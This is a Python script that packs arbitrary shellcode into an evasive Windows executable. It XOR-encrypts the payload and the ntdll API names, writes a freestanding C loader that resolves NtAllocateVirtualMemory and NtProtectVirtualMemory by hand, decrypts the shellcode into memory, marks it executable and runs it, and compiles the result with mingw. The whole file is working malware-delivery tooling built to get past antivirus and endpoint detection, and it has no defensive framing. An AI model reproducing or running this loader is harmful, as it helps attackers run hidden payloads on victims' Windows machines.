import os
import sys
import subprocess
import random

if len(sys.argv) < 3:
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-k <key>] [-l <length>]")
    sys.exit(1)

bin_file = sys.argv[1]
output_exe = sys.argv[2]

# Default key is a single random byte
key = [random.randint(1, 255)]
key_length = 1

# Parse optional length (-l)
if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])
    if key_length < 1 or key_length > 256:
        print("Error: key length must be between 1 and 256")
        sys.exit(1)
    key = [random.randint(1, 255) for _ in range(key_length)]

# Parse optional key (-k)
if "-k" in sys.argv:
    k_index = sys.argv.index("-k")
    k_value = sys.argv[k_index + 1]

    if "," in k_value:
        key = [int(b, 16) if b.startswith("0x") else int(b) for b in k_value.split(",")]
    elif k_value.startswith("0x"):
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        key = [int(k_value)]

    key_length = len(key)

with open(bin_file, "rb") as f:
    shellcode = f.read()

def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_c_string(s: str, key: list[int]) -> bytes:
    data = s.encode() + b'\x00'
    return xor_bytes(data, key)

xor_shellcode = xor_bytes(shellcode, key)

ntdll_name = xor_c_string("ntdll.dll", key)
ntalloc_name = xor_c_string("NtAllocateVirtualMemory", key)
ntprotect_name = xor_c_string("NtProtectVirtualMemory", key)

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

shellcode_array = bytes_to_c_array(xor_shellcode)
key_array = bytes_to_c_array(key)
ntdll_array = bytes_to_c_array(ntdll_name)
ntalloc_array = bytes_to_c_array(ntalloc_name)
ntprotect_array = bytes_to_c_array(ntprotect_name)

# Generate C loader code
c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"))) static char shellcode[] = {{ {shellcode_array} }};
__attribute__((section(".text"))) static char key[] = {{ {key_array} }};

unsigned char ntdll_dll_enc[] = {{ {ntdll_array} }};
unsigned char ntallocatevirtualmemory_enc[] = {{ {ntalloc_array} }};
unsigned char ntprotectvirtualmemory_enc[] = {{ {ntprotect_array} }};

__attribute__((section(".text.start")))
void _start() {{
    SIZE_T size = sizeof(shellcode);
    SIZE_T key_len = sizeof(key);

    for (SIZE_T i = 0; i < sizeof(ntdll_dll_enc); i++)
        ntdll_dll_enc[i] ^= key[i % key_len];
    for (SIZE_T i = 0; i < sizeof(ntallocatevirtualmemory_enc); i++)
        ntallocatevirtualmemory_enc[i] ^= key[i % key_len];
    for (SIZE_T i = 0; i < sizeof(ntprotectvirtualmemory_enc); i++)
        ntprotectvirtualmemory_enc[i] ^= key[i % key_len];

    HMODULE hNtdll = myLoadLibraryA(ntdll_dll_enc);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory_enc);

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory_enc);

    LPVOID execMemory = NULL;
    SIZE_T regionSize = size;
    NTSTATUS status;

    status = pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < size; i++)
        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];

    ULONG oldProtect;
    status = pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}
'''

# Compile the code to a temporary exe
compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-fno-ident", "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-fPIC", "-fno-asynchronous-unwind-tables",
    "-x", "c", "-", "-o", output_exe
]

proc = subprocess.run(compile_cmd, input=c_code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if proc.returncode != 0:
    print("Compilation failed:\n", proc.stderr.decode())
else:
    print(f"Executable generated: {output_exe} (XOR key: {key_array})")
